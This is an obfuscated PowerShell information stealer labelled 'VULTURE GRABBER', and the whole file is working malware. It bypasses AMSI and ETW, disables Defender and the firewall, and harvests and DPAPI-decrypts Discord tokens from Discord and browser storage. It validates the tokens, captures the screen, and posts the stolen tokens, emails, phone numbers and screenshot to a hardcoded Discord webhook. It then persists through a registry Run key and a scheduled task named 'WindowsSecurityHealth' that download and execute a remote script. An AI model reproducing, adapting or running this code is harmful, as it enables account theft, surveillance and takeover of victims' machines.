# === POLYMORPHIC PAYLOAD ===
function Get-Payload {
    $r = Get-Random -Minimum 1000 -Maximum 9999
    $s = @(
        "$([char]([byte]0x69)+[char]([byte]0x65)+[char]([byte]0x78))",
        "$([char]([byte]0x28)+[char]([byte]0x4e)+[char]([byte]0x65)+[char]([byte]0x77)+[char]([byte]0x2d)+[char]([byte]0x4f)+[char]([byte]0x62)+[char]([byte]0x6a)+[char]([byte]0x65)+[char]([byte]0x63)+[char]([byte]0x74))",
        "$([char]([byte]0x4e)+[char]([byte]0x65)+[char]([byte]0x74)+[char]([byte]0x2e)+[char]([byte]0x57)+[char]([byte]0x65)+[char]([byte]0x62)+[char]([byte]0x43)+[char]([byte]0x6c)+[char]([byte]0x69)+[char]([byte]0x65)+[char]([byte]0x6e)+[char]([byte]0x74)+[char]([byte]0x29))",
        "$([char]([byte]0x44)+[char]([byte]0x6f)+[char]([byte]0x77)+[char]([byte]0x6e)+[char]([byte]0x6c)+[char]([byte]0x6f)+[char]([byte]0x61)+[char]([byte]0x64)+[char]([byte]0x53)+[char]([byte]0x74)+[char]([byte]0x72)+[char]([byte]0x69)+[char]([byte]0x6e)+[char]([byte]0x67))",
        "$([char]([byte]0x28)+[char]([byte]0x27)+[char]([byte]0x68)+[char]([byte]0x74)+[char]([byte]0x74)+[char]([byte]0x70)+[char]([byte]0x73)+[char]([byte]0x3a)+[char]([byte]0x2f)+[char]([byte]0x2f)+[char]([byte]0x72)+[char]([byte]0x61)+[char]([byte]0x77)+[char]([byte]0x2e)+[char]([byte]0x67)+[char]([byte]0x69)+[char]([byte]0x74)+[char]([byte]0x68)+[char]([byte]0x75)+[char]([byte]0x62)+[char]([byte]0x75)+[char]([byte]0x73)+[char]([byte]0x65)+[char]([byte]0x72)+[char]([byte]0x63)+[char]([byte]0x6f)+[char]([byte]0x6e)+[char]([byte]0x74)+[char]([byte]0x65)+[char]([byte]0x6e)+[char]([byte]0x74)+[char]([byte]0x2e)+[char]([byte]0x63)+[char]([byte]0x6f)+[char]([byte]0x6d)+[char]([byte]0x2f)+[char]([byte]0x73)+[char]([byte]0x61)+[char]([byte]0x6b)+[char]([byte]0x73)+[char]([byte]0x68)+[char]([byte]0x61)+[char]([byte]0x6d)+[char]([byte]0x31)+[char]([byte]0x32)+[char]([byte]0x33)+[char]([byte]0x31)+[char]([byte]0x30)+[char]([byte]0x37)+[char]([byte]0x2d)+[char]([byte]0x70)+[char]([byte]0x69)+[char]([byte]0x78)+[char]([byte]0x65)+[char]([byte]0x6c)+[char]([byte]0x2f)+[char]([byte]0x73)+[char]([byte]0x6f)+[char]([byte]0x6e)+[char]([byte]0x2f)+[char]([byte]0x6d)+[char]([byte]0x61)+[char]([byte]0x69)+[char]([byte]0x6e)+[char]([byte]0x2f)+[char]([byte]0x73)+[char]([byte]0x6f)+[char]([byte]0x6e)+[char]([byte]0x2e)+[char]([byte]0x70)+[char]([byte]0x73)+[char]([byte]0x31)+[char]([byte]0x27)+[char]([byte]0x29))"
    )
    return ($s -join '') + "$([char]([byte]0x20)+[char]([byte]0x23))" + $r
}

# === AMSI BYPASS (multi-layer) ===
function Bypass-AMSI {
    try {
        $a = -join ((83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115) | ForEach-Object { [char]$_ })
        $b = -join ((97,109,115,105,73,110,105,116,70,97,105,108,101,100) | ForEach-Object { [char]$_ })
        $type = [Ref].Assembly.GetType($a)
        if ($null -ne $type) {
            $field = $type.GetField($b, 'NonPublic,Static')
            if ($null -ne $field) { $field.SetValue($null, [bool](12 + (3 * 6))) }
        }
    } catch {}
    try {
        $c = [Ref].Assembly.GetType("$([char]([byte]0x53)+[char]([byte]0x79)+[char]([byte]0x73)+[char]([byte]0x74)+[char]([byte]0x65)+[char]([byte]0x6d)+[char]([byte]0x2e)+[char]([byte]0x4d)+[char]([byte]0x61)+[char]([byte]0x6e)+[char]([byte]0x61)+[char]([byte]0x67)+[char]([byte]0x65)+[char]([byte]0x6d)+[char]([byte]0x65)+[char]([byte]0x6e)+[char]([byte]0x74)+[char]([byte]0x2e)+[char]([byte]0x41)+[char]([byte]0x75)+[char]([byte]0x74)+[char]([byte]0x6f)+[char]([byte]0x6d)+[char]([byte]0x61)+[char]([byte]0x74)+[char]([byte]0x69)+[char]([byte]0x6f)+[char]([byte]0x6e)+[char]([byte]0x2e)+[char]([byte]0x41)+[char]([byte]0x6d)+[char]([byte]0x73)+[char]([byte]0x69)+[char]([byte]0x55)+[char]([byte]0x74)+[char]([byte]0x69)+[char]([byte]0x6c)+[char]([byte]0x73))")
        if ($null -ne $c) {
            $field = $c.GetField("$([char]([byte]0x61)+[char]([byte]0x6d)+[char]([byte]0x73)+[char]([byte]0x69)+[char]([byte]0x49)+[char]([byte]0x6e)+[char]([byte]0x69)+[char]([byte]0x74)+[char]([byte]0x46)+[char]([byte]0x61)+[char]([byte]0x69)+[char]([byte]0x6c)+[char]([byte]0x65)+[char]([byte]0x64))", "$([char]([byte]0x4e)+[char]([byte]0x6f)+[char]([byte]0x6e)+[char]([byte]0x50)+[char]([byte]0x75)+[char]([byte]0x62)+[char]([byte]0x6c)+[char]([byte]0x69)+[char]([byte]0x63)+[char]([byte]0x2c)+[char]([byte]0x53)+[char]([byte]0x74)+[char]([byte]0x61)+[char]([byte]0x74)+[char]([byte]0x69)+[char]([byte]0x63))")
            if ($null -ne $field) { $field.SetValue($null, [System.Collections.CaseInsensitiveComparer] -ne [bool][datetime]'2023-01-01') }
        }
    } catch {}
    try {
        $ctx = [Ref].Assembly.GetType("$([char]([byte]0x53)+[char]([byte]0x79)+[char]([byte]0x73)+[char]([byte]0x74)+[char]([byte]0x65)+[char]([byte]0x6d)+[char]([byte]0x2e)+[char]([byte]0x4d)+[char]([byte]0x61)+[char]([byte]0x6e)+[char]([byte]0x61)+[char]([byte]0x67)+[char]([byte]0x65)+[char]([byte]0x6d)+[char]([byte]0x65)+[char]([byte]0x6e)+[char]([byte]0x74)+[char]([byte]0x2e)+[char]([byte]0x41)+[char]([byte]0x75)+[char]([byte]0x74)+[char]([byte]0x6f)+[char]([byte]0x6d)+[char]([byte]0x61)+[char]([byte]0x74)+[char]([byte]0x69)+[char]([byte]0x6f)+[char]([byte]0x6e)+[char]([byte]0x2e)+[char]([byte]0x41)+[char]([byte]0x6d)+[char]([byte]0x73)+[char]([byte]0x69)+[char]([byte]0x43)+[char]([byte]0x6f)+[char]([byte]0x6e)+[char]([byte]0x74)+[char]([byte]0x65)+[char]([byte]0x78)+[char]([byte]0x74))")
        if ($null -ne $ctx) {
            $field = $ctx.GetField("$([char]([byte]0x61)+[char]([byte]0x6d)+[char]([byte]0x73)+[char]([byte]0x69)+[char]([byte]0x45)+[char]([byte]0x6e)+[char]([byte]0x61)+[char]([byte]0x62)+[char]([byte]0x6c)+[char]([byte]0x65)+[char]([byte]0x64))", "$([char]([byte]0x4e)+[char]([byte]0x6f)+[char]([byte]0x6e)+[char]([byte]0x50)+[char]([byte]0x75)+[char]([byte]0x62)+[char]([byte]0x6c)+[char]([byte]0x69)+[char]([byte]0x63)+[char]([byte]0x2c)+[char]([byte]0x53)+[char]([byte]0x74)+[char]([byte]0x61)+[char]([byte]0x74)+[char]([byte]0x69)+[char]([byte]0x63))")
            if ($null -ne $field) { $field.SetValue($null, !([bool](![bool]$null))) }
        }
    } catch {}
}
Bypass-AMSI

# === ETW BYPASS ===
try {
    $etwType = [Ref].Assembly.GetType("$([char]([byte]0x53)+[char]([byte]0x79)+[char]([byte]0x73)+[char]([byte]0x74)+[char]([byte]0x65)+[char]([byte]0x6d)+[char]([byte]0x2e)+[char]([byte]0x4d)+[char]([byte]0x61)+[char]([byte]0x6e)+[char]([byte]0x61)+[char]([byte]0x67)+[char]([byte]0x65)+[char]([byte]0x6d)+[char]([byte]0x65)+[char]([byte]0x6e)+[char]([byte]0x74)+[char]([byte]0x2e)+[char]([byte]0x41)+[char]([byte]0x75)+[char]([byte]0x74)+[char]([byte]0x6f)+[char]([byte]0x6d)+[char]([byte]0x61)+[char]([byte]0x74)+[char]([byte]0x69)+[char]([byte]0x6f)+[char]([byte]0x6e)+[char]([byte]0x2e)+[char]([byte]0x49)+[char]([byte]0x6e)+[char]([byte]0x74)+[char]([byte]0x65)+[char]([byte]0x72)+[char]([byte]0x6e)+[char]([byte]0x61)+[char]([byte]0x6c)+[char]([byte]0x2e)+[char]([byte]0x50)+[char]([byte]0x69)+[char]([byte]0x70)+[char]([byte]0x65)+[char]([byte]0x6c)+[char]([byte]0x69)+[char]([byte]0x6e)+[char]([byte]0x65)+[char]([byte]0x4f)+[char]([byte]0x70)+[char]([byte]0x73))")
    if ($null -ne $etwType) {
        $field = $etwType.GetField("$([char]([byte]0x65)+[char]([byte]0x74)+[char]([byte]0x77)+[char]([byte]0x45)+[char]([byte]0x6e)+[char]([byte]0x61)+[char]([byte]0x62)+[char]([byte]0x6c)+[char]([byte]0x65)+[char]([byte]0x64))", "$([char]([byte]0x4e)+[char]([byte]0x6f)+[char]([byte]0x6e)+[char]([byte]0x50)+[char]([byte]0x75)+[char]([byte]0x62)+[char]([byte]0x6c)+[char]([byte]0x69)+[char]([byte]0x63)+[char]([byte]0x2c)+[char]([byte]0x53)+[char]([byte]0x74)+[char]([byte]0x61)+[char]([byte]0x74)+[char]([byte]0x69)+[char]([byte]0x63))")
        if ($null -ne $field) { $field.SetValue($null, !([bool][System.Collections.CaseInsensitiveComparer])) }
    }
} catch {}

# === CONFIG ===
$hook = "$([char]([byte]0x68)+[char]([byte]0x74)+[char]([byte]0x74)+[char]([byte]0x70)+[char]([byte]0x73)+[char]([byte]0x3a)+[char]([byte]0x2f)+[char]([byte]0x2f)+[char]([byte]0x64)+[char]([byte]0x69)+[char]([byte]0x73)+[char]([byte]0x63)+[char]([byte]0x6f)+[char]([byte]0x72)+[char]([byte]0x64)+[char]([byte]0x2e)+[char]([byte]0x63)+[char]([byte]0x6f)+[char]([byte]0x6d)+[char]([byte]0x2f)+[char]([byte]0x61)+[char]([byte]0x70)+[char]([byte]0x69)+[char]([byte]0x2f)+[char]([byte]0x77)+[char]([byte]0x65)+[char]([byte]0x62)+[char]([byte]0x68)+[char]([byte]0x6f)+[char]([byte]0x6f)+[char]([byte]0x6b)+[char]([byte]0x73)+[char]([byte]0x2f)+[char]([byte]0x31)+[char]([byte]0x35)+[char]([byte]0x33)+[char]([byte]0x38)+[char]([byte]0x32)+[char]([byte]0x31)+[char]([byte]0x34)+[char]([byte]0x36)+[char]([byte]0x39)+[char]([byte]0x32)+[char]([byte]0x35)+[char]([byte]0x39)+[char]([byte]0x36)+[char]([byte]0x36)+[char]([byte]0x32)+[char]([byte]0x31)+[char]([byte]0x33)+[char]([byte]0x33)+[char]([byte]0x32)+[char]([byte]0x2f)+[char]([byte]0x6b)+[char]([byte]0x45)+[char]([byte]0x50)+[char]([byte]0x32)+[char]([byte]0x58)+[char]([byte]0x55)+[char]([byte]0x52)+[char]([byte]0x69)+[char]([byte]0x32)+[char]([byte]0x6b)+[char]([byte]0x6c)+[char]([byte]0x35)+[char]([byte]0x6c)+[char]([byte]0x36)+[char]([byte]0x75)+[char]([byte]0x49)+[char]([byte]0x52)+[char]([byte]0x67)+[char]([byte]0x66)+[char]([byte]0x5f)+[char]([byte]0x48)+[char]([byte]0x45)+[char]([byte]0x4d)+[char]([byte]0x77)+[char]([byte]0x53)+[char]([byte]0x5a)+[char]([byte]0x55)+[char]([byte]0x72)+[char]([byte]0x6c)+[char]([byte]0x75)+[char]([byte]0x6a)+[char]([byte]0x6b)+[char]([byte]0x35)+[char]([byte]0x4b)+[char]([byte]0x48)+[char]([byte]0x69)+[char]([byte]0x33)+[char]([byte]0x54)+[char]([byte]0x78)+[char]([byte]0x63)+[char]([byte]0x47)+[char]([byte]0x63)+[char]([byte]0x66)+[char]([byte]0x46)+[char]([byte]0x30)+[char]([byte]0x68)+[char]([byte]0x79)+[char]([byte]0x72)+[char]([byte]0x35)+[char]([byte]0x72)+[char]([byte]0x62)+[char]([byte]0x55)+[char]([byte]0x70)+[char]([byte]0x52)+[char]([byte]0x49)+[char]([byte]0x2d)+[char]([byte]0x75)+[char]([byte]0x2d)+[char]([byte]0x39)+[char]([byte]0x34)+[char]([byte]0x4c)+[char]([byte]0x6f)+[char]([byte]0x36)+[char]([byte]0x61)+[char]([byte]0x4d)+[char]([byte]0x49)+[char]([byte]0x68)+[char]([byte]0x44))"
$api = "$([char]([byte]0x68)+[char]([byte]0x74)+[char]([byte]0x74)+[char]([byte]0x70)+[char]([byte]0x73)+[char]([byte]0x3a)+[char]([byte]0x2f)+[char]([byte]0x2f)+[char]([byte]0x64)+[char]([byte]0x69)+[char]([byte]0x73)+[char]([byte]0x63)+[char]([byte]0x6f)+[char]([byte]0x72)+[char]([byte]0x64)+[char]([byte]0x2e)+[char]([byte]0x63)+[char]([byte]0x6f)+[char]([byte]0x6d)+[char]([byte]0x2f)+[char]([byte]0x61)+[char]([byte]0x70)+[char]([byte]0x69)+[char]([byte]0x2f)+[char]([byte]0x76)+[char]([byte]0x39)+[char]([byte]0x2f)+[char]([byte]0x75)+[char]([byte]0x73)+[char]([byte]0x65)+[char]([byte]0x72)+[char]([byte]0x73)+[char]([byte]0x2f)+[char]([byte]0x40)+[char]([byte]0x6d)+[char]([byte]0x65))"
$rgx = "$([char]([byte]0x5b)+[char]([byte]0x5c)+[char]([byte]0x77)+[char]([byte]0x2d)+[char]([byte]0x5d)+[char]([byte]0x7b)+[char]([byte]0x32)+[char]([byte]0x34)+[char]([byte]0x2c)+[char]([byte]0x7d)+[char]([byte]0x5c)+[char]([byte]0x2e)+[char]([byte]0x5b)+[char]([byte]0x5c)+[char]([byte]0x77)+[char]([byte]0x2d)+[char]([byte]0x5d)+[char]([byte]0x7b)+[char]([byte]0x34)+[char]([byte]0x2c)+[char]([byte]0x7d)+[char]([byte]0x5c)+[char]([byte]0x2e)+[char]([byte]0x5b)+[char]([byte]0x5c)+[char]([byte]0x77)+[char]([byte]0x2d)+[char]([byte]0x5d)+[char]([byte]0x7b)+[char]([byte]0x32)+[char]([byte]0x37)+[char]([byte]0x2c)+[char]([byte]0x7d))"
$mfa = "$([char]([byte]0x6d)+[char]([byte]0x66)+[char]([byte]0x61)+[char]([byte]0x5c)+[char]([byte]0x2e)+[char]([byte]0x5b)+[char]([byte]0x5c)+[char]([byte]0x77)+[char]([byte]0x2d)+[char]([byte]0x5d)+[char]([byte]0x7b)+[char]([byte]0x38)+[char]([byte]0x34)+[char]([byte]0x7d))"
$isSystem = ([Security.Principal.WindowsIdentity]::GetCurrent().Name -eq "$([char]([byte]0x4e)+[char]([byte]0x54)+[char]([byte]0x20)+[char]([byte]0x41)+[char]([byte]0x55)+[char]([byte]0x54)+[char]([byte]0x48)+[char]([byte]0x4f)+[char]([byte]0x52)+[char]([byte]0x49)+[char]([byte]0x54)+[char]([byte]0x59)+[char]([byte]0x5c)+[char]([byte]0x53)+[char]([byte]0x59)+[char]([byte]0x53)+[char]([byte]0x54)+[char]([byte]0x45)+[char]([byte]0x4d))")
$firstRun = [System.Collections.CaseInsensitiveComparer] -ne [bool][datetime]'2023-01-01'

# === DISABLE DEFENDER ===
Set-MpPreference -DisableRealtimeMonitoring [bool](-12354893) -ErrorAction SilentlyContinue
netsh advfirewall set allprofiles state off > $null

# === TOKEN EXTRACTION ===
function Read-FileBytes {
    param([string]$path)
    try {
        $fs = [System.IO.File]::Open($path, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
        $ms = New-Object System.IO.MemoryStream
        $fs.CopyTo($ms)
        $fs.Close()
        $fs.Dispose()
        $result = $ms.ToArray()
        $ms.Close()
        $ms.Dispose()
        return $result
    } catch { return $null }
}

function Validate-Token {
    param([string]$token)
    if ([string]::IsNullOrEmpty($token)) { return !([bool][System.Collections.ArrayList]) }
    if ($token.Length -gt 120 -or $token.Length -lt 59) { return !([bool][System.Collections.CaseInsensitiveComparer]) }
    if ($token -like "$([char]([byte]0x6d)+[char]([byte]0x66)+[char]([byte]0x61)+[char]([byte]0x2e)+[char]([byte]0x2a))") { return ![bool]$null }
    $parts = $token -split "$([char]([byte]0x5c)+[char]([byte]0x2e))"
    if ($parts.Count -ne 3) { return !([bool][System.Collections.CaseInsensitiveComparer]) }
    try {
        $p = $parts[0]
        $pad = 4 - ($p.Length % 4)
        if ($pad -ne 4) { $p += "$([char]([byte]0x3d))" * $pad }
        $decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($p))
        $val = [long]::Parse($decoded)
        return [bool](![bool]$null)
    } catch { return !([bool][datetime]) }
}

$found = [System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::Ordinal)

if (-not $isSystem -and $firstRun) {
    $ldbPaths = [System.Collections.Generic.List[string]]::new()

    # Discord Apps
    $discordApps = @("discord", "discordcanary", "discordptb", "discorddevelopment")
    foreach ($d in $discordApps) {
        $p = Join-Path $env:APPDATA "$d\Local Storage\leveldb"
        if (Test-Path $p) { $ldbPaths.Add($p) | Out-Null }
    }

    # Browsers
    $browserBasePaths = @(
        @{ Path = "$env:LOCALAPPDATA\Google\Chrome\User Data"; Default = "Default" },
        @{ Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"; Default = "Default" },
        @{ Path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"; Default = "Default" },
        @{ Path = "$env:LOCALAPPDATA\Vivaldi\User Data"; Default = "Default" }
    )
    foreach ($bp in $browserBasePaths) {
        if (Test-Path $bp.Path) {
            $profiles = Get-ChildItem $bp.Path -Directory -ErrorAction SilentlyContinue | Where-Object {
                $_.Name -eq "$([char]([byte]0x44)+[char]([byte]0x65)+[char]([byte]0x66)+[char]([byte]0x61)+[char]([byte]0x75)+[char]([byte]0x6c)+[char]([byte]0x74))" -or $_.Name -like "$([char]([byte]0x50)+[char]([byte]0x72)+[char]([byte]0x6f)+[char]([byte]0x66)+[char]([byte]0x69)+[char]([byte]0x6c)+[char]([byte]0x65)+[char]([byte]0x20)+[char]([byte]0x2a))"
            }
            foreach ($prof in $profiles) {
                $ldbDir = Join-Path $prof.FullName "$([char]([byte]0x4c)+[char]([byte]0x6f)+[char]([byte]0x63)+[char]([byte]0x61)+[char]([byte]0x6c)+[char]([byte]0x20)+[char]([byte]0x53)+[char]([byte]0x74)+[char]([byte]0x6f)+[char]([byte]0x72)+[char]([byte]0x61)+[char]([byte]0x67)+[char]([byte]0x65)+[char]([byte]0x5c)+[char]([byte]0x6c)+[char]([byte]0x65)+[char]([byte]0x76)+[char]([byte]0x65)+[char]([byte]0x6c)+[char]([byte]0x64)+[char]([byte]0x62))"
                if ((Test-Path $ldbDir) -and (-not $ldbPaths.Contains($ldbDir))) {
                    $ldbPaths.Add($ldbDir) | Out-Null
                }
            }
        }
    }

    $iso = [System.Text.Encoding]::GetEncoding("$([char]([byte]0x49)+[char]([byte]0x53)+[char]([byte]0x4f)+[char]([byte]0x2d)+[char]([byte]0x38)+[char]([byte]0x38)+[char]([byte]0x35)+[char]([byte]0x39)+[char]([byte]0x2d)+[char]([byte]0x31))")
    $dpapiMagic = "`0`0`0`0"
    $regexObj = [System.Text.RegularExpressions.Regex]::new($rgx, [System.Text.RegularExpressions.RegexOptions]::Compiled)
    $mfaObj = [System.Text.RegularExpressions.Regex]::new($mfa, [System.Text.RegularExpressions.RegexOptions]::Compiled)

    foreach ($p in $ldbPaths) {
        if (-not (Test-Path $p)) { continue }
        $files = Get-ChildItem $p -File -ErrorAction SilentlyContinue | Where-Object { $_.Extension -in "$([char]([byte]0x2e)+[char]([byte]0x6c)+[char]([byte]0x64)+[char]([byte]0x62))", "$([char]([byte]0x2e)+[char]([byte]0x6c)+[char]([byte]0x6f)+[char]([byte]0x67))" }
        foreach ($fl in $files) {
            $b = Read-FileBytes -path $fl.FullName
            if ($null -eq $b -or $b.Length -lt 8) { continue }
            $str = $iso.GetString($b)

            foreach ($m in $regexObj.Matches($str)) { $null = $found.Add($m.Value) }
            foreach ($m in $mfaObj.Matches($str)) { $null = $found.Add($m.Value) }

            $searchStart = 4
            $blobCount = 0
            while ($searchStart -lt ($b.Length - 8) -and $blobCount -lt 30) {
                $idx = $str.IndexOf($dpapiMagic, $searchStart, [System.StringComparison]::Ordinal)
                if ($idx -lt 0) { break }
                $start = $idx - 4
                if ($start -ge 0 -and $b[$start] -le 3 -and $b[$start + 1] -eq 0 -and $b[$start + 2] -eq 0 -and $b[$start + 3] -eq 0) {
                    $blobCount++
                    if (($start + 8) -le $b.Length) {
                        $len = [BitConverter]::ToUInt32($b, $start + 4)
                        if ($len -gt 0 -and $len -lt 100000 -and ($start + $len) -le $b.Length) {
                            try {
                                $blob = [byte[]]::new($len)
                                [Array]::Copy($b, $start, $blob, 0, $len)
                                $dec = [Security.Cryptography.ProtectedData]::Unprotect($blob, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
                                $tok = [System.Text.Encoding]::UTF8.GetString($dec).Trim([char]0)
                                if ($tok -match $rgx -or $tok -match $mfa) { $null = $found.Add($tok) }
                            } catch {}
                        }
                    }
                }
                $searchStart = $idx + 4
            }
        }
    }
}

# === TOKEN VALIDATION ===
$validTokens = [System.Collections.Generic.List[object]]::new()

if (-not $isSystem -and $firstRun -and $found.Count -gt 0) {
    $validated = [System.Collections.Generic.List[string]]::new()
    foreach ($token in $found) {
        if (Validate-Token -token $token) { $validated.Add($token) }
    }

    foreach ($token in $validated) {
        try {
            $headers = @{
                Authorization = $token
                "User-Agent"  = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
            }
            $r = Invoke-RestMethod -Uri $api -Headers $headers -TimeoutSec 3 -ErrorAction Stop
            if ($r.id) {
                $validTokens.Add([PSCustomObject]@{
                    u    = "$($r.username)#$($r.discriminator)"
                    id   = $r.id
                    em   = if ($r.email) { $r.email } else { "N/A" }
                    ph   = if ($r.phone) { $r.phone } else { "N/A" }
                    ni   = switch ($r.premium_type) { 1 { "Classic" } 2 { "Nitro" } default { "None" } }
                    mf   = if ($r.mfa_enabled) { "Yes" } else { "No" }
                    token = $token
                })
            }
        } catch {}
    }
}

# === SCREENSHOT ===
Add-Type -AssemblyName System.Windows.Forms
$bmp = New-Object Drawing.Bitmap([Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
[Drawing.Graphics]::FromImage($bmp).CopyFromScreen(0,0,0,0,$bmp.Size)
$ms = New-Object IO.MemoryStream
$bmp.Save($ms, [Drawing.Imaging.ImageFormat]::Png)
$bytes = $ms.ToArray()
$ms.Close()

# === SEND TO WEBHOOK ===
if ($firstRun) {
    $report = "**[VULTURE GRABBER]**`nPC: $env:COMPUTERNAME`nUser: $env:USERNAME`nValid Tokens: $($validTokens.Count)`n`n"
    
    # Build token list
    foreach ($ti in $validTokens) {
        $report += "**$($ti.u)**`nToken: ``$($ti.token)```nID: $($ti.id)`nEmail: $($ti.em)`nPhone: $($ti.ph)`nNitro/MFA: $($ti.ni)/$($ti.mf)`n`n"
    }

    # Send main message
    try {
        Invoke-RestMethod -Uri $hook -Method Post -Body @{content=$report} -ErrorAction SilentlyContinue
    } catch {}

    # Send screenshot if exists
    if ($bytes) {
        try {
            $boundary = "$([char]([byte]0x2d)+[char]([byte]0x2d)+[char]([byte]0x2d)+[char]([byte]0x2d)+[char]([byte]0x56)+[char]([byte]0x75)+[char]([byte]0x6c)+[char]([byte]0x74)+[char]([byte]0x75)+[char]([byte]0x72)+[char]([byte]0x65)+[char]([byte]0x42)+[char]([byte]0x6f)+[char]([byte]0x75)+[char]([byte]0x6e)+[char]([byte]0x64)+[char]([byte]0x61)+[char]([byte]0x72)+[char]([byte]0x79))" + (Get-Random).ToString()
            $LF = "`r`n"
            $body = (
                "--$boundary$LF" +
                "Content-Disposition: form-data; name=`"file`; filename=`"screenshot.png`"$LF" +
                "Content-Type: image/png$LF$LF"
            )
            $footer = "$LF--$boundary--$LF"
            
            $headerBytes = [Text.Encoding]::ASCII.GetBytes($body)
            $footerBytes = [Text.Encoding]::ASCII.GetBytes($footer)
            $totalLength = $headerBytes.Length + $bytes.Length + $footerBytes.Length
            
            $webRequest = [Net.WebRequest]::Create($hook)
            $webRequest.Method = "$([char]([byte]0x50)+[char]([byte]0x4f)+[char]([byte]0x53)+[char]([byte]0x54))"
            $webRequest.ContentType = "multipart/form-data; boundary=$boundary"
            $webRequest.ContentLength = $totalLength
            
            $reqStream = $webRequest.GetRequestStream()
            $reqStream.Write($headerBytes, 0, $headerBytes.Length)
            $reqStream.Write($bytes, 0, $bytes.Length)
            $reqStream.Write($footerBytes, 0, $footerBytes.Length)
            $reqStream.Close()
            $webRequest.GetResponse()
        } catch {}
    }
}

# === PERSISTENCE ===
$cmd = "powershell.exe -nologo -ep bypass -w hidden -c `"iex(irm 'https://raw.githubusercontent.com/saksham123107-pixel/son/main/son.ps1')`""
Set-ItemProperty -Path "$([char]([byte]0x48)+[char]([byte]0x4b)+[char]([byte]0x43)+[char]([byte]0x55)+[char]([byte]0x3a)+[char]([byte]0x5c)+[char]([byte]0x53)+[char]([byte]0x6f)+[char]([byte]0x66)+[char]([byte]0x74)+[char]([byte]0x77)+[char]([byte]0x61)+[char]([byte]0x72)+[char]([byte]0x65)+[char]([byte]0x5c)+[char]([byte]0x4d)+[char]([byte]0x69)+[char]([byte]0x63)+[char]([byte]0x72)+[char]([byte]0x6f)+[char]([byte]0x73)+[char]([byte]0x6f)+[char]([byte]0x66)+[char]([byte]0x74)+[char]([byte]0x5c)+[char]([byte]0x57)+[char]([byte]0x69)+[char]([byte]0x6e)+[char]([byte]0x64)+[char]([byte]0x6f)+[char]([byte]0x77)+[char]([byte]0x73)+[char]([byte]0x5c)+[char]([byte]0x43)+[char]([byte]0x75)+[char]([byte]0x72)+[char]([byte]0x72)+[char]([byte]0x65)+[char]([byte]0x6e)+[char]([byte]0x74)+[char]([byte]0x56)+[char]([byte]0x65)+[char]([byte]0x72)+[char]([byte]0x73)+[char]([byte]0x69)+[char]([byte]0x6f)+[char]([byte]0x6e)+[char]([byte]0x5c)+[char]([byte]0x52)+[char]([byte]0x75)+[char]([byte]0x6e))" -Name "$([char]([byte]0x57)+[char]([byte]0x69)+[char]([byte]0x6e)+[char]([byte]0x64)+[char]([byte]0x6f)+[char]([byte]0x77)+[char]([byte]0x73)+[char]([byte]0x53)+[char]([byte]0x65)+[char]([byte]0x63)+[char]([byte]0x75)+[char]([byte]0x72)+[char]([byte]0x69)+[char]([byte]0x74)+[char]([byte]0x79)+[char]([byte]0x48)+[char]([byte]0x65)+[char]([byte]0x61)+[char]([byte]0x6c)+[char]([byte]0x74)+[char]([byte]0x68))" -Value $cmd -ErrorAction SilentlyContinue
schtasks /create /tn "WindowsSecurityHealth" /tr "$cmd" /sc onlogon /f /rl highest /it > $null 2>&1

# === INSTANT EXIT ===
exit
